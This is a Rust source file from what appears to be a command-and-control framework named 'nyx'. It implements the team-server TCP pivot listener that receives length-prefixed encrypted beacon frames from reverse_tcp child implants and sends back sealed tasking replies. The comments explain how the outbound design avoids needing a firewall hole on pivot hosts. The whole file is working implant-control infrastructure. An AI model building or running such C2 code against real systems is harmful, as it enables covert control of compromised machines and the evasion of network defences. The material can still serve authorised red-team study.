//! TCP pivot listener — the parent side of the reverse_tcp beacon channel
//! (spec-3).
//!
//! The implant's `channels/tcp.rs` is a reverse_tcp *child*: it opens a TCP
//! connection to a parent, sends ONE length-prefixed encrypted frame, reads
//! the length-prefixed reply, and closes the socket (stateless per
//! `send_recv`). This module is that parent, hosted by the team server
//! (`NYX_TCP_PIVOT_ADDR`, e.g. `0.0.0.0:4444`):
//!
//! ```text
//!   child implant ──reverse_tcp──▶ team server :4444
//!        [4B LE len][frame]  ──▶  parse_frame → handle_frame (same core
//!                                 funnel as /beacon)
//!        ◀─ [4B LE len][reply]    sealed reply written back, socket closed
//! ```
//!
//! The child connects OUTBOUND (reverse_tcp), so no inbound firewall hole is
//! needed on the pivot host — only the parent must be reachable. A parent
//! implant's bind socket works identically; this module is the server-side
//! instance.
//!
//! ## Wire format
//!
//! Identical to the implant child side (`crates/implant-win/src/channels/tcp.rs`):
//! 4-byte little-endian u32 length prefix + payload, both directions. One
//! request per connection (the child's `send_recv` is stateless).

use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};

use crate::AppState;

/// Max inbound frame the listener accepts. The protocol ceiling is
/// `FRAME_HEADER + MAX_CT_LEN + TAG` ≈ 528 KiB; 1 MiB admits every encodable
/// frame while bounding the pre-auth buffering a connection can trigger.
const MAX_FRAME: usize = 1024 * 1024;
/// Per-phase I/O deadline (matches the child's 10 s SO_SNDTIMEO/RCVTIMEO with
/// headroom for the funnel).
const IO_TIMEOUT: Duration = Duration::from_secs(30);

/// Spawn the TCP pivot listener. Runs forever; logs on bind failure.
pub fn spawn(state: Arc<AppState>, bind: String) {
    tokio::spawn(async move {
        let listener = match tokio::net::TcpListener::bind(&bind).await {
            Ok(l) => l,
            Err(e) => {
                tracing::error!(
                    target: "nyx::pivot",
                    %bind, error = %e,
                    "TCP pivot listener failed to bind; reverse_tcp channel disabled"
                );
                return;
            }
        };
        tracing::info!(target: "nyx::pivot", %bind, "TCP pivot listener ready (reverse_tcp parent)");
        loop {
            let (stream, peer) = match listener.accept().await {
                Ok(x) => x,
                Err(e) => {
                    tracing::warn!(target: "nyx::pivot", error = %e, "accept failed");
                    continue;
                }
            };
            let state = state.clone();
            tokio::spawn(async move {
                if let Err(e) = serve_connection(&state, stream, peer).await {
                    tracing::debug!(target: "nyx::pivot", %peer, error = %e, "pivot transaction failed");
                }
            });
        }
    });
}

/// Serve one child connection: one length-prefixed frame in, one
/// length-prefixed reply out, then close. Public so tests can drive the
/// per-connection path directly.
pub async fn serve_connection(
    state: &Arc<AppState>,
    mut stream: tokio::net::TcpStream,
    peer: SocketAddr,
) -> std::io::Result<()> {
    let _ = stream.set_nodelay(true);

    // Read the 4-byte LE length prefix.
    let mut len_buf = [0u8; 4];
    tokio::time::timeout(IO_TIMEOUT, stream.read_exact(&mut len_buf))
        .await
        .map_err(|_| {
            std::io::Error::new(std::io::ErrorKind::TimedOut, "length prefix timeout")
        })??;
    let frame_len = u32::from_le_bytes(len_buf) as usize;
    if frame_len == 0 || frame_len > MAX_FRAME {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            format!("frame length {frame_len} outside (0, {MAX_FRAME}]"),
        ));
    }

    // Read the frame body.
    let mut frame = vec![0u8; frame_len];
    tokio::time::timeout(IO_TIMEOUT, stream.read_exact(&mut frame))
        .await
        .map_err(|_| std::io::Error::new(std::io::ErrorKind::TimedOut, "frame body timeout"))??;

    // Same channel-agnostic funnel as /beacon — decrypt, queue results, seal
    // reply. A garbage frame is the child's problem to retry; we drop the
    // connection either way.
    let raw = match nyx_protocol::parse_frame(&frame) {
        Ok(r) => r,
        Err(e) => {
            tracing::debug!(target: "nyx::pivot", %peer, error = %e, "pivot frame parse failed");
            return Ok(()); // drop silently — no reply for garbage
        }
    };
    let reply = match crate::handle_frame(state, &peer, &raw) {
        Ok(r) => r,
        Err(e) => {
            tracing::warn!(target: "nyx::pivot", %peer, error = %e, "pivot frame handling failed");
            return Ok(()); // no reply — child retries on a fresh connection
        }
    };
    if reply.len() > MAX_FRAME {
        tracing::warn!(target: "nyx::pivot", %peer, bytes = reply.len(), "pivot reply exceeds cap; dropped");
        return Ok(());
    }

    // Write the length-prefixed reply, then close.
    let mut out = Vec::with_capacity(4 + reply.len());
    out.extend_from_slice(&(reply.len() as u32).to_le_bytes());
    out.extend_from_slice(&reply);
    tokio::time::timeout(IO_TIMEOUT, stream.write_all(&out))
        .await
        .map_err(|_| std::io::Error::new(std::io::ErrorKind::TimedOut, "reply write timeout"))??;
    let _ = stream.shutdown().await;
    Ok(())
}
